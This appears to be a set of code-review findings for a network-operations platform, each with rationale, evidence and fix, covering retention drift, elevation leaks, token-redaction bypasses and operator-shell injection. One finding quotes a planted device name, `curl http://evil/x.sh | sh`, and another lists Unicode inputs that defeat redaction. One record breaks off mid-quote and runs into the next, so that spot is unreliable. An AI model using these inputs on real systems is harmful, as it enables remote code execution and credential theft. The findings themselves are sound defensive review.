rationale: Reproduces at HEAD (package untouched since the review). The SQL floor predicate is `(data->>'method' = ANY($3) AND data->>'path' LIKE ANY($4))` — methods plus `platformPathPrefixes` only. The Go classifier it is supposed to mirror, `IsPlatformPath` (platformtrail.go:232-241), checks `matchesPrefix(p, platformPathExclusions)` FIRST and returns false. The exclusion list (platformtrail.go:181-204) is precisely the high-volume, non-config traffic: /api/auth/login, /api/auth/refresh, /api/auth/logout, /api/auth/mfa/, /api/auth/elevation, /api/auth/sso/callback, plus the copilot and inbound-webhook routes under retained prefixes. Under the sweep those rows satisfy the floor predicate, so a POST /api/auth/login row is deleted only at `platformCutoff` (AUDIT_PLATFORM_TRAIL_DAYS, default 90 — main.go:2313-2314) instead of at the operator's AUDIT_RETENTION_DAYS horizon. Pure over-retention: no row is lost, no cross-tenant read, no auth boundary. Not rc1_blocking — the growth is bounded by a 90-day default and the whole sweeper is opt-in and off by default; the harm is a retention policy that quietly does not apply to the noisiest class of rows (and their usernames/IPs). Note the two directions are also unequal in the SQL: `data->>'path'` still carries any query string, so `LIKE prefix || '%'` matches paths the Go side normalises first — same class of drift, same fix.
evidence: retention.go:83 `const platformFloorSQL = \`(data->>'method' = ANY($3) AND data->>'path' LIKE ANY($4))\`` versus platformtrail.go:237-240 `if matchesPrefix(p, platformPathExclusions) { return false }; return matchesPrefix(p, platformPathPrefixes)`. `git log d796bf7d..9d981e5e -- src/backend/internal/audit/` is empty.
suggested_fix: Bind the exclusion list as a fifth array parameter and make the floor `(method = ANY($3) AND path LIKE ANY($4) AND path NOT LIKE ALL($6))`, then pin it with a test that drives IsPlatformChange and the SQL predicate over the same corpus so the two cannot drift again.

rationale: Reproduces at HEAD. `b, err := s.completeElevationLogin(...)` persists the binding (breakglass.go:401 `s.bindings.Add(...)`), and the two gates that follow — `enforceConcurrentLoginDeny` (oidc.go:394) and `mintSession` (oidc.go:399) — both `s.ssoFail(...)` and return with no `s.bindings.Remove(b.ID)` anywhere on those paths. The grant is keyed on the principal, not the session: `PrincipalID: u.Username` (breakglass.go:402), and although `ConditionElevationSID` is stamped when the IdP supplies a sid (breakglass.go:389-391) it is never consulted at authorization time — the only reader in the non-test tree is a display field, bindings_api.go:202 `"idp_session": target.ConditionString(ConditionElevationSID) != ""`. So elevated rights attach to any session that principal already holds or opens next, after the server told them the sign-in failed. Second-order damage from the same window: completeElevationLogin drops every prior elevation for the principal before adding the new one (breakglass.go:392-400), so a refused sign-in also silently revokes a legitimately-held grant. Kept at low — the privileges are the ones the IdP just authorised for that person, and the trigger requires the concurrent-login policy or session minting to fail — but rc1_blocking, because it is a live authorization artifact left behind by a path the server reported as refused.
evidence: oidc.go:387-402: `b, err := s.completeElevationLogin(...)` … `if err := s.enforceConcurrentLoginDeny(r, user); err != nil { s.ssoFail(w, r, err.Error()); return }` … `access, refresh, err := s.mintSession(r, user); if err != nil { s.ssoFail(w, r, err.Error()); return }` — no Remove on either. `grep -rn ConditionElevationSID src/backend` shows no authorization-time consumer.
suggested_fix: Move `completeElevationLogin` after the concurrent-login and mintSession gates, or wrap the tail in a defer that removes b.ID unless the redirect is reached; audit the rollback either way.

rationale: Reproduces at HEAD and is a straightforward inconsistency: the standing success path (oidc.go:335) and ssoFail (oidc.go:424) both call `s.ssoPostLoginPath(r, …)`, which returns the tenant's own locator path when the request arrived on a per-tenant callback (oidc_config.go:983-990); the elevation success path alone calls `p.PostLoginURL()`. A tenant-bound elevation sign-in therefore lands on the generic front door instead of /t/{slug} or /org/{id}. No security consequence: the token/refresh/state fragment is identical and the SPA consumes it per-origin, not per-path (the locator cookie is HttpOnly and the M20 nonce lives in sessionStorage/the ssoPendingCookie, both origin-scoped), so the session is minted and accepted. What is lost is the deep-link restore and the tenant's own entry point that ssoPostLoginPath exists to preserve. Not rc1_blocking — no isolation, authz, data or correctness surface is touched.
evidence: oidc.go:417 `http.Redirect(w, r, p.PostLoginURL()+"#"+frag.Encode(), http.StatusFound)` against oidc.go:335 `http.Redirect(w, r, s.ssoPostLoginPath(r, p)+"#"+frag.Encode(), ...)` and oidc.go:424 (ssoFail) `s.ssoPostLoginPath(r, s.oidcProvider())`. Pinned behaviour of the helper: tenant_signin_test.go:521-529.
suggested_fix: One-line change to `s.ssoPostLoginPath(r, p)` at oidc.go:417, plus a case in tenant_signin_test.go asserting a tenant-bound elevation callback returns to the tenant locator path.

rationale: The behaviour is real but it is the stated design, written down at the call site and pinned by a test — which is what disposition 5 asks for. handleAuthMethods' contract comment says it outright: "With no locator the answer is unchanged (every configured button), because the bare sign-in page is the platform's own front door and every existing deployment depends on it" (auth_config.go:489-492), and providerVisible restates it at :552-561 ("A nil candidate is the generic sign-in page — unchanged behaviour, every configured button"). TestSignInPageListsOnlyTheCandidateRealmsProviders pins it as the first assertion: "// No locator — today's behaviour: every configured button." (tenant_signin_test.go:278-281). The finding's supporting claim is also inaccurate and worth recording: those buttons do NOT always refuse. `ssoLoginRedirectURI` (oidc_config.go:962-967) resolves a tenant-bound alias to that tenant's callback path regardless of whether a locator cookie is present, so a generic-page start on a bound alias returns through /t/{slug}/sso/{alias}/callback and carries the full realm constraint from ssoCallbackRealm — that tenant's own users sign in normally, and only foreign accounts are refused (the 1dad6a16 constraint holds through this door, so the generic page is not a bypass of it). What remains is disclosure of tenant IdP aliases and display names to an anonymous visitor of the bare sign-in page. That is a product decision (hide bound connections behind the locator, at the cost of every pre-locator deployment's front door), not a defect against stated behaviour; if the owner wants it changed it should be filed as a config choice, not as this row.
evidence: auth_config.go:489-492 comment; auth_config.go:558-563 `if c == nil { return true }; return c.Reaches(tid, org)`; tenant_signin_test.go:277-281 `// No locator — today's behaviour: every configured button.` / `if got := ssoButtons(t, f.srv); len(got) != 3 { t.Fatalf("generic sign-in should list every button, got %v", got) }`; oidc_config.go:963-965 `if c, ok := s.connectionLocator(alias); ok { return ssoPublicBase(r) + c.CallbackPath(alias) }`.
suggested_fix: If the disclosure is unacceptable for a multi-tenant deployment, add an explicit platform setting (default = today's behaviour) that hides tenant-BOUND connections from the locator-less /api/auth/methods answer, and pin both states in tenant_signin_test.go.

rationale: Reproduces at HEAD (file untouched since the review). `api.permissions().then(...).catch(() => { if (live) setPerms({}); })` collapses a failed read into the same empty grid a legitimately-empty grant produces, the fetch is a one-shot mount effect with no retry, and ScopePicker renders `options.length === 0` as "Checking which scopes your role may issue…" — a present-progressive message that never resolves. The `// default-closed: offer nothing` comment justifies the empty value but not the missing error state, and CLAUDE.md §10 forbids silent failures. The mint is genuinely still gated: `generate()` (:2091-2112) never consults `perms`, and the wizard's Finish is not disabled, so a key can be created with the default `scopes` state `["read:metrics"]` the operator never saw offered — but the server re-authorises every scope, so nothing escalates and the worst case is a confusing 403 or a key with one scope. Not rc1_blocking: no privilege boundary moves, no data is lost or leaked, and no security result is misrepresented — it is a stuck loading string and a swallowed error.
evidence:
admin.tsx:2064-2067 `api.permissions().then((p) => { if (live) setPerms(p.permissions ?? {}); }).catch(() => { if (live) setPerms({}); }); // default-closed: offer nothing`; admin.tsx:1990-1991 `if (options.length === 0) { return

Checking which scopes your role may issue…

; }`; admin.tsx:2091 `const generate = async () => { if (!label.trim()) return; ... }` — no perms check.
suggested_fix: Track the three states separately (loading / loaded / failed): on failure render the error with a Retry, and distinguish "your role may issue no scopes" from "still checking"; block Finish while the grid is unknown so no key is minted against an unseen default.

rationale: Reproduces verbatim at 9d981e5e. os_fetch execs curl INSIDE the opensearch container against url="https://localhost:9200" and adds `cacert = "$OS_PROBE_CACERT"` with no -k and no --resolve. Two other scripts in this same tree document that this exact URL cannot verify: stack-watchdog.sh:930-936 ('the issued SAN set is `DNS:opensearch` + the SPIFFE URI and nothing else, so https://localhost fails hostname verification (curl exit 60, http 000) and blinded every search-tier check on TLS installs') and host-hygiene.sh:123 ('--resolve, never -k: the issued SAN set is `DNS:opensearch` plus a SPIFFE URI and NO IP address'). The watchdog fixed it by using https://opensearch:9200; support-bundle was not carried along, so both search-tier collectors (store/opensearch-cluster-health.json, store/opensearch-indices.txt) fail on every TLS install. Not rc1-blocking: the failure is loud (MANIFEST rows + exit 2), it degrades a diagnostic artifact only, and it touches none of the blocking classes — no data, auth, tenant, correctness or silent-failure exposure.
evidence: support-bundle.sh:398 `url="https://localhost:9200"`; :409 `cfg="$cfg"$'\n'"cacert = \"$OS_PROBE_CACERT\""...`; contrast stack-watchdog.sh:936 `OS_PROBE_URL="https://opensearch:9200"` and its comment at :929-935. The ClickHouse probe in the same file already uses a service name (CH_PROBE_URL="http://clickhouse:8123", :351).
suggested_fix: Use `https://opensearch:9200` (the name the SVID carries, resolvable in-container via compose DNS) on the TLS branch, exactly as stack-watchdog.sh does. Do not add -k.

rationale: Reproduces. The file is `set -eu` (line 11) and line 274 is a bare `ALL_REPOS=$(curl -s -m 10 "$OS/_snapshot/_all" 2>/dev/null)` with no pipe and no `|| true`, so a transport error (connection refused / timeout — curl exits 7/28) aborts the script. Probe confirms the semantics: `sh -c 'set -eu; X=$(false); echo reached'` prints nothing, exit 1. The `if [ -z "${ALL_REPOS:-}" ]` fallback written directly beneath it — whose comment states the deliberate §16.1 intent ('an unreadable guard is NOT a passed guard — name it. We still register, because refusing on an unproven conflict would leave a fresh stack with no backup at all') — is therefore unreachable for the case it was written for. Note the five pre-existing curl assignments at 81/151/153/198/200 are NOT affected: they are pipelines, so the exit status is sed's. The genuinely bare ones are 129, 162, 208, 274, 307, 378, 407, 469. rc1_blocking: the abort happens AFTER the ISM policy PUTs but BEFORE snapshot-repository registration and the SM daily-snapshot policy, so the outcome is a stack with no backup repository and no snapshot schedule. opensearch-init is `restart: "no"` with no dependent gating on its exit (docker-compose.yml:832-858) and install.py never inspects its exit code (no reference to opensearch-init's result anywhere in install.py), so on a fresh install this is a silent loss of the data-protection control — the same class as the 2026-08-26 unrestorable-netops-fs incident this block exists to prevent. deploy-qualify.sh would catch it on a later run, but only if it is run.
evidence: apply-ism.sh:11 `set -eu`; :274 `  ALL_REPOS=$(curl -s -m 10 "$OS/_snapshot/_all" 2>/dev/null)`; :275-282 the dead WARNING branch; docker-compose.yml:835 `restart: "no"`; shell probe `sh -c 'set -eu; X=$(false); echo reached'` → no output, exit 1.
suggested_fix: Append `|| true` (or `|| ALL_REPOS=""`) to each bare curl assignment so the written fallback branch runs, and keep the §16.1 warning text. Same one-line treatment for 129, 162, 208, 307, 378, 407, 469.

rationale: Reproduces at 9d981e5e; d21a410c changed alertTenant's device-less branch but not this fire/resolve asymmetry. The fire leg files with `e.notifyState.MarkNotified(e.tenantOf(a), a)` (engine.go:478); the resolve leg re-derives with `e.notifyState.Clear(e.tenantOf(a), id)` (engine.go:515). tenantOf → srv.alertTenant (alert_episodes.go:99-107), which returns "" when `s.discovery.Get(a.DeviceID)` misses (device deleted) and a different string when the device is re-tenanted. NotifyStateStore.Clear is deliberately strictly own-tenant ('clearing under the wrong tenant is a no-op rather than a cross-tenant delete', notifystate.go:260-262), so the record survives under the old tenant key. On the next restart SetNotifyState (engine.go:205-230) restores every tenant's records into e.active and e.dispatched, the first tick finds the alert no longer firing, and DispatchResolve fires again — then Clear no-ops again. It repeats on every restart until notifyStateMaxAge (7*24h, notifystate.go:66) prunes on the LastSeen stamp, which Touch never refreshes for a non-active alert. The store is not at fault; the engine is, for re-deriving instead of using the tenant it filed under. rc1_blocking: customer-visible alerting correctness — repeated spurious resolve notifications (PagerDuty incident closes) for an alert that ended days earlier, one per api restart.
evidence: engine.go:478 `e.notifyState.MarkNotified(e.tenantOf(a), a)`; engine.go:515 `e.notifyState.Clear(e.tenantOf(a), id)`; alert_episodes.go:103-106 `if d, ok := s.discovery.Get(a.DeviceID); ok { return deviceTenant(d) }` / `return ""`; notifystate.go:269-272 `t := normTenant(tenant); if _, ok := s.byTenant[t][id]; !ok { return }`; engine.go:213-225 restore loop over `s.Tenants()` setting `e.active[a.ID]` and `e.dispatched[a.ID] = true`; notifystate.go:66 `notifyStateMaxAge = 7 * 24 * time.Hour`. engine.go:515 is the only production caller of Clear.
suggested_fix: Remember the tenant the record was filed under (e.g. a map id→tenant alongside e.dispatched, seeded from the restore loop which already has rec.TenantID) and pass that to Clear/Touch, rather than re-deriving from live device state at resolve time. Keep Clear's own-tenant strictness as is.

rationale: Reproduces. The repo2 guard is `elif [ -n "$REPO2_NAME" ] && [ "$REPO2_LOCATION" = "$REPO_LOCATION" ]` — one exact string compare against the hard-coded REPO_LOCATION=/usr/share/opensearch/snapshots. $ALL_REPOS, already fetched 100 lines earlier in the same `if [ "${SNAP_KEEP:-14}" -gt 0 ]` block and therefore in scope, is never consulted, so repo2 is not checked against any OTHER registered repository's location either. A trailing slash defeats both guards: the netops-fs guard greps `\"location\"[[:space:]]*:[[:space:]]*\"$REPO_LOCATION\"` with the closing quote in the pattern, so a repository registered at '/usr/share/opensearch/snapshots/' does not match; and the repo2 string compare fails for the same reason. OpenSearch resolves both to one blob tree. That is precisely the corruption hazard the surrounding 20-line comment says it exists to prevent ('two independent deleters over one blob tree, which ends in snapshots that list shards whose blobs are gone (restore fails with NoSuchFileException) while the repo still reads healthy'). rc1_blocking: the failure mode is silent, unrestorable backups — the exact shape of the 2026-08-26→09-03 seven-day incident. Precondition is an operator typo in an opt-in, default-off env var, which is why it stays low, not why it stays unblocking.
evidence: apply-ism.sh:371 `elif [ -n "$REPO2_NAME" ] && [ "$REPO2_LOCATION" = "$REPO_LOCATION" ]; then`; :274 `ALL_REPOS=$(curl ... /_snapshot/_all ...)` in the same block, unused after :296; :288-291 the netops-fs grep `grep -E "\"location\"[[:space:]]*:[[:space:]]*\"$REPO_LOCATION\""`; :251 `REPO_LOCATION="/usr/share/opensearch/snapshots"`.
suggested_fix: Normalise both locations (strip trailing slashes, collapse '/./') before comparing, and run repo2 through the same ALL_REPOS location scan the netops-fs guard uses — the listing is already in hand.

rationale: Reproduces. For a git-retained artifact with no archive record, release_manifest stamps `{"status": STATUS_VERIFIED, "method": "git-retained+sha256", "verified_at": _today(), "measured_sha256": entry["sha256"], "detail": "retained in this repository's history and re-hashed"}`. Nothing in that path hashes anything: the only gate is retained_copy(), which is `path if os.path.isfile(path) else None` (line 1111-1117). measured_sha256 is the PIN echoed back, not a measurement, and the detail string asserts a re-hash that did not happen. The asymmetry is real and reachable, not merely theoretical: release_fetch does `got = sha256_file(dest); if got != sha: raise ComplianceFailure(... rationale: Reproduces exactly at 9d981e5e, on both ends of the wire. KafkaStage sets req.ProbeSrc for KindFlow and PRINTS it in the operator-visible Query string, but NewKafkaPeek's request body is a five-key map that never serialises it, and the sidecar neither accepts nor uses such a key: _debug_peek_params returns only {topic, marker, max_seconds, max_records, lookback_seconds} and _debug_kafka_peek's needle is hard-coded to needle = ("cx_debug=" + params["marker"]).encode(). A goflow2 record on netops.flows.raw is JSON of the flow tuple and can never contain that text (flow.go's own header: 'A flow record has NO such field ... So the marker is DERIVED into a flow tuple instead'). Therefore the bus stage of EVERY flow trace returns not_seen while ClickHouseStage, which queries the same fingerprint via FlowMarkerCH(marker), returns seen. That is precisely the inverted verdict this tool exists to eliminate, and it points the operator at a healthy goflow2->Kafka hop. Secondary cost: follow() retries not_seen, so the sidecar is re-POSTed and a fresh ephemeral Kafka consumer is spun every pollInterval = 3s for the whole TTL. No test covers it in either language (no hit for ProbeSrc/probe_src in any *_test.go or test_pipeline_debug_sidecar.py), so this is not a test-double artefact - the shipped path simply drops the field. rc1_blocking: customer-visible correctness of a shipped operator diagnostic; the debugger's verdict IS the product.
evidence: transport.go NewKafkaPeek: `body := map[string]any{"topic": req.Topic, "marker": req.Marker, "max_seconds": req.MaxSeconds, "max_records": req.MaxRecords, "lookback_seconds": req.LookbackSeconds,}` - no probe_src. main.py _debug_kafka_peek: `needle = ("cx_debug=" + params["marker"]).encode()` ... `if needle not in payload: continue`. stages.go:235-237 sets and prints req.ProbeSrc. `grep -rn 'probe_src' --include=*.py .` -> no hits.
suggested_fix: Send "probe_src": req.ProbeSrc in the peek body, and teach _debug_peek_params to validate it against the closed RFC 5737 grammar (^192\.0\.2\.(1-254)$) and _debug_kafka_peek to accept a record matching EITHER needle; the Go side already re-verifies every returned record with verifyFlowRecords, so the loose bus needle cannot promote another probe's record.

rationale: Reproduces. netops.corr_signals declares `signal_id UUID` (deployment/docker/clickhouse/init.sql:312), so `ORDER BY s.ts DESC, s.signal_id DESC` sorts in ClickHouse's NATIVE UUID order while the keyset predicate compares `toString(s.signal_id) < 'sid'`, i.e. canonical-text byte order. The repo has MEASURED that these two orders differ (timeintel/cursor.go:194-220, ClickHouse 24.8.14.39, 2026-09-01: 'every UUID with a zero second half sorts before every UUID with a non-zero one, whatever its first half - text order says the opposite'), and CompareCorrelationUUID exists solely because of it. ts is DateTime64(3) and the cursor round-trips exact milliseconds, so an exact ts tie at a page boundary is a real, common state on a busy feed. On such a tie: a row whose native position is after the last returned row but whose text is greater is excluded forever (silent drop); a row already returned whose text is lesser is returned again (duplicate). The tracker-200 comment at :212-222 shows the qualification was added to make the tie-break bind the column the ORDER BY names, but the toString() was left in the predicate, so the two halves still disagree. The sibling queries (cloud/signals.go:720, cloud_security.go:102) alias to signal_id_s and carry no cursor, so events_feed.go is the only site with the mismatch. rc1_blocking: customer-visible correctness - the unified event feed silently loses events during pagination.
evidence: events_feed.go:227 `itemConds = where + " AND (s.ts < '" + ets + "' OR (s.ts = '" + ets + "' AND toString(s.signal_id) < '" + sid + "'))"` vs :239 ` ORDER BY s.ts DESC, s.signal_id DESC`. init.sql:312 `signal_id      UUID,`. timeintel/cursor.go:199 native-order measurement.
suggested_fix: Make both halves use one order. Cheapest and least risky: `ORDER BY s.ts DESC, toString(s.signal_id) DESC` so the sort matches the text predicate (and matches the cursor Go emits from the projected string). Alternatively compare the raw UUID: `s.signal_id < toUUID('<sid>')`. Add a regression test asserting the ORDER BY expression and the cursor predicate name the same expression.

rationale: Reproduces, and the premise checks out end to end. traceCommand does `parts.push(`--device ${o.device}`)` with no quoting or escaping, and PipelineDebugger.tsx renders the result inside <Cli> under the page's stated purpose 'an operator who learns the verb here can run it from a terminal during an incident'. The device string reaches it straight from the inventory dropdown (`<option value={d.name || d.id}>`), and a discovered device's stored name is the raw sysName (main.go:763 'The stored name (raw sysName for scan devices)'). The only sanitiser on that path is collectors/sanitizeLabel = clampRunes(scrubControl(s),128), and scrubControl only maps runes < 0x20 / 0x7f to spaces and collapses whitespace - `;` `|` `&` `$` backtick and spaces all survive. So a rogue or compromised device on the SNMP discovery range (default 10.0.0.0/8) can plant `core1; curl http://evil/x.sh | sh` as its sysName and the platform's own screen will render that as a command for a platform admin to copy into a root-capable ops shell. Note the backend's own ValidDeviceKey is a closed hostname grammar (letters/digits/-_.:) - the UI is the one place that string is emitted without a grammar, so the fix is a UI-side quote/refuse, not new backend work. No XSS (React escapes it); the whole risk is copy-paste. rc1_blocking: privilege boundary - untrusted device-controlled text becomes an operator-executed shell command.
evidence: pipelineDebugger.model.ts:290-296 `const parts = ["correlix-debug trace", `--kind ${o.kind}`]; ... if (o.device) parts.push(`--device ${o.device}`);` ; PipelineDebugger.tsx:511-515 `<option key={d.id} value={d.name || d.id}>` ; collectors/caps.go:62-75 scrubControl/sanitizeLabel (no shell-metacharacter class) ; inject.go:59-76 ValidDeviceKey shows the intended closed grammar.
suggested_fix: Single-quote every interpolated value in traceCommand (and logsCommand/bundleCommand), POSIX-style: `'` -> `'\''`; or reuse the backend's closed grammar client-side and render <unsafe device name> plus a warning when it fails. Add a model unit test with a metacharacter-bearing device name.

rationale: Reproduced with a standalone Go probe of the exact shipped function, and the real behaviour is WORSE than filed. stripBearer indexes into `lower := strings.ToLower(s)` and then slices the ORIGINAL s, so any rune whose lowercase differs in byte length desynchronises the two. Both directions exist and both are harmful: (a) growth runes (U+023A, U+023E; 2 bytes -> 3) shift start to the right, leaking one token byte per such rune - `ȺȺȺȺ ... bearer SUPERSECRETTOKENVALUE` came back as `... bearer SUPE[REDACTED]`, i.e. the attacker chooses how much leaks; (b) SHRINK runes (U+0130 'İ' and U+1E9E 'ẞ'; Go's unicode.ToLower makes these shorter) shift start left onto the prefix's trailing space, isTokenBreak fires, `end == start` takes the `continue` branch, and the token is left ENTIRELY unredacted - `İ ... authorization: bearer SUPERSECRETTOKENVALUE` came back verbatim. That is a whole-credential leak, not a partial one, which is why I raise low -> medium. The leaked line lands in the 0700 session directory and bundlewriter.go states it deliberately does not re-redact ('REDACTION is NOT applied here, deliberately: Session.Line runs the pass when each line is WRITTEN, so the directory on disk is already safe to share'), so it flows into the support bundle handed to a third party. rc1_blocking: credentials/secrets.
evidence: redact.go:61-63 `lower := strings.ToLower(s)` ... `i := strings.Index(lower[idx:], p)` ... `s = s[:start] + mark + s[end:]`. Probe output (copy of the shipped stripBearer, Go, run in scratchpad and deleted): `"" -> "... bearer [REDACTED]"`, `"Ⱥ" (len delta +1) -> "... bearer S[REDACTED]"`, `"ȺȺȺȺ" (+4) -> "... bearer SUPE[REDACTED]"`, `"İ" (-1) -> "... bearer SUPERSECRETTOKENVALUE"`, `"ẞ" (-1) -> "... bearer SUPERSECRETTOKENVALUE"`. bundlewriter.go:16-19 confirms no second pass.
suggested_fix: Do not index one string with another's offsets. Either scan s directly with a case-insensitive prefix match (strings.EqualFold over the candidate window at each byte offset), or build lower with an ASCII-only lowering map (r >= 'A' && r <= 'Z' -> r+32), which is length-preserving by construction and sufficient for these header/query-parameter prefixes. Add a table test with U+023A, U+023E, U+0130 and U+1E9E.

rationale: Reproduces on the code. The loop does `data, err := os.ReadFile(...)` and only then `total += int64(len(data)); if limit > 0 && total > limit { return ErrBundleTooLarge }`, so MaxBundleBytes (32 MiB) bounds the SUM of already-resident members and cannot bound the FIRST one: a single 600 MiB member is fully resident before the check fires. The api path (sessions.go:474 serveBundle) then also copies it into tarBuf and again into gzBuf, so the peak is ~3x the file inside a 512 MiB container - an OOM kill of the api, which is the one process an operator is debugging with. The CLI path passes limit=0 and has no bound at all. Reachability is as filed and no worse: files under the api's own <DATA_DIR>/debug are written by sessionwrite.go from the bounded ring (RingCapacity = 1000 lines), so an oversized member requires the documented non-default host mount - sessions.go:69-74 'An operator who also wants the HOST-side CLI's data/debug visible here mounts it and points this variable at the mount' - carrying a CLI `logs` capture. Caller is platform-admin-only. That keeps it a low, but it is a real unbounded read with a two-line fix, and the comment above the constant asserts a bound it does not deliver. rc1_blocking: process crash / uncontrolled resource exhaustion.
evidence: bundlewriter.go:109-116 `data, err := os.ReadFile(filepath.Join(dir, name))` ... `total += int64(len(data))` ... `if limit > 0 && total > limit { return "", ErrBundleTooLarge{...} }`. bundlewriter.go:57-61 'MaxBundleBytes bounds a bundle assembled IN MEMORY (the api's download path).' sessions.go:474 `WriteBundleTar(&tarBuf, []string{dir}, MaxBundleBytes)`. cli/bundle.go:141 `WriteBundleTar(f, dirs, 0)`.
suggested_fix: os.Stat the entry first and refuse with ErrBundleTooLarge before reading when fi.Size() would push total past limit; or open the file and copy through an io.LimitReader of (limit-total)+1, treating a full read as the overflow. Also give the CLI path a (large) non-zero limit rather than 0 so a pathological member cannot balloon the host process either.

rationale: Reproduces. follow()'s poll loop skips any stage whose recorded verdict is not VerdictNotSeen, and notObservable() is used for BOTH structural non-observability (a sampled lane, a kind with no bus hop, a store that mints no per-record series) and purely transient faults - 'OpenSearch query failed', 'reading the OpenSearch response failed', 'OpenSearch answered %d', 'OpenSearch response was not decodable JSON', 'Kafka peek unavailable', 'VictoriaMetrics export failed', 'ClickHouse query failed', 'corr_evidence query failed'. One connection blip on the FIRST poll therefore fixes that stage's answer for the entire TTL with no retry, exactly during the store instability the tool is most often run under. Not INTENTIONAL: the doc comment ('A stage SETTLES on `seen` or `not_observable`') describes the mechanism and is written about the structural case ('A SAMPLED lane cannot answer'), never about query failures. Not rc1_blocking: the verdict is honest and self-describing - the reason names the query failure verbatim, so no false 'not seen' and no silent failure; the operator loses a retry, not the truth. Fix is small and worth doing.

rationale: The described sequence is real: the accumulator is emptied under the lock and the job is only then handed to the async drain, which for tierDigest takes exactly one attempt. So a push failure loses that window's content, and the stated justification (`a digest is re-sent next window with the accumulated content`) only holds for conditions still firing — vmalert re-sends those and they re-fold. A warning that fired and cleared inside the failed window is gone. But: warning tier only (page and page-resolution are pushed immediately and DO retry with backoff since the 2026-09-03 429 storm); the loss is neither silent nor uncounted (WARN log naming alertname=PlatformWarningDigest plus hostFailed/hostRateLimited counters); and the alerts themselves are not lost — only the phone summary of them. The remediation (retain-on-failure) reintroduces exactly the unbounded/duplicate-send problem the current design chose against, so it is worth doing but not before rc1.

Failure is reported: `r.log(level, "platform alert push to host monitoring FAILED", ...)` with `hostFailed` incremented.
suggested_fix: Either re-fold the entries back into r.digest on a terminal delivery failure (merging with anything accumulated meanwhile), or drain only after a successful push.

rationale: Reproduces exactly, and it is the one row in this shard that can drop a PAGE with no trace. Alerts 501..n are discarded inside readAlerts with no metric, no log line and no field in the 200 response body, and `received` is incremented only over the survivors, so the response tells the caller everything it sent was accounted for. Every other per-alert outcome in this handler (dispatched, suppressed, dropped_tenant, dropped_customer, heartbeat) has both a counter and a response field — the truncation is the single silent exit. Raised low→medium: this is the monitoring layer whose whole reason to exist is the 2026-09-02 outage where an alert that fired was delivered nowhere, and §10 forbids silent failure. Reachable within the 1 MiB body cap: the package's own bound test posts maxAlertsPerRequest+50 alerts in roughly 47 KB, and realistic vmalert batches of 500 alerts with annotations are ~250-400 KB, well under maxBodyBytes.

rationale: Both raises are real and confirmed by probe, and both are swallowed by the handler's blanket except, so the client gets a bare connection close instead of the 401/413 the code intends. But the consequences are benign in every direction that matters: it FAILS CLOSED (the TypeError propagates out of _debug_authorized, so no request is ever authorized by it — there is no auth-bypass), the sidecar thread survives by design, and the failure is counted and logged (HEALTH_SIDECAR_ERRORS + a WARN naming the exception type), so it is not a silent failure. The surface is default-closed twice over: the sidecar only listens when CORR_HEALTH_SIDECAR_PORT > 0, and _sidecar_debug_response answers 503 unless CORR_DEBUG_TOKEN is set. What is left is response-shape rudeness on deliberately malformed input to an operator debug route — worth fixing, not before rc1.
evidence: `return hmac.compare_digest(value[len(prefix):], CORR_DEBUG_TOKEN)` with `value = (auth_header or "").strip()` — http.server decodes headers latin-1, so any byte >= 0x80 after 'Bearer ' yields a non-ASCII str; probed: `TypeError: comparing strings with non-ASCII characters is not supported`. main.py:13809 `length = int(self.headers.get("Content-Length") or 0)` — probed `ValueError: invalid literal for int() with base 10: 'abc'`. do_POST wraps the whole body in `except Exception as exc: ... HEALTH_SIDECAR_ERRORS += 1; log.warning("health sidecar POST failed (%s): %s — total=%d", ...)` and writes no response after the raise.
suggested_fix: Compare bytes (`value[len(prefix):].encode('latin-1','ignore')` vs the token encoded) or reject non-ASCII headers up front, wrap the int() in try/except ValueError → 400, and give do_POST a fallback that always writes a response before the blanket except.

where: src/correlation/engine.py:1907-1932 (bound_hypotheses_blob rungs B and C); block built at engine.py:2705
rationale: Reproduced by probe at 9d981e5e. The ladder's ordering assumption — that the only unbounded term inside path_graph is `relations` — is false: the block is embedded IN FULL (endpoints, service_bindings, nat_sessions, routes are the whole tenant view, not the used subset), and none of those are reachable by rung A. When the oversize sits in one of them, rung A's budget goes negative and sheds every relation for nothing, rung B then sheds every unprotected hypothesis one at a time and still never fits, and rung C finally deletes the block — which alone would have fitted with everything intact. Probe: 1,693,326 B in → marker `dropped_relations: 20, dropped_hypotheses: 3, dropped_blocks: [grounding_context.path_graph]`, one hypothesis surviving; deleting the block alone gives 17,083 B (1.6 % of the 1 MiB cap) with all four hypotheses and all relations. That is permanent, irreversible loss of competing hypotheses from the stored corr_object — the ranking evidence the RCA answer is read back from — so it is rc1-blocking on correlation/RCA correctness and state loss. Severity held at medium: the top hypothesis, the verdict tier and every contradicted hypothesis are still protected, so the headline answer is not changed, and the loss is declared in the row's `hypotheses_truncated` marker.
evidence: Probe run in the worktree against the shipped function: `out,marker = engine.bound_hypotheses_blob(blob, 1<<20)` with a doc whose bulk is `grounding_context.path_graph.endpoints` → `{"original_bytes": 1693326, "cap_bytes": 1048576, "dropped": 23, "dropped_relations": 20, "dropped_hypotheses": 3, "dropped_blocks": ["grounding_context.path_graph"]}`, hypotheses left = 1, while `len(_dump(doc without path_graph)) == 17083`. Code: rung A budgets only over `pg.get("relations")` (`overhead = original_bytes - (sum(sizes) - 1)`), rung B at :1907 `hyps = ranking.get("hypotheses")` drops the tail, rung C at :1930 `del ctx["path_graph"]`. engine.py:2705 shows the block carries `observations/endpoints/service_bindings/nat_sessions/routes` — `The view is embedded IN FULL (nat_sessions/routes/freshness_s included)`. The design note at :1731-1745 states the assumption explicitly: `So the unbounded term is path_graph.relations ... The ladder below therefore sheds THAT first, and the ranking only after.`
suggested_fix: Between A and B, add a rung that tests deleting the whole path_graph block (or sheds its other lists) and only falls through to the ranking if that still does not fit; equivalently, re-measure after A and skip B when dropping the block alone would fit.

rationale: Reproduces end to end, and both halves of the premise check out. (a) `post()` re-enqueues only on `res.status === 503`; every other non-2xx falls off the `.then` with no branch at all, and the events were already removed from the queue by `queue.splice(0, MAX_BATCH)` in flush(), so a 400/401/403 destroys the batch permanently — no console line, no counter, no backoff, and the same thing happens to every batch after it, forever. (b) The 400 is not hypothetical: the server decodes the batch with `dec.DisallowUnknownFields()` (experience/http.go:1325) into `eventWire`, whose `Cohort` is a STRUCT with a fixed field set (journey.go:260-269), while cohort() copies arbitrary keys out of `cfg.cohort` — `for (var k in cfg.cohort) … c[k] = String(cfg.cohort[k])`. One custom cohort dimension therefore 400s every batch for the life of the install. A revoked or mistyped ingest key (401) behaves identically. Raised low→medium: this is total, permanent, silent loss of a tenant's RUM evidence with a green-looking page, and it contradicts the file's own stated doctrine for exactly this case. rc1_blocking on silent failure and durable telemetry loss.
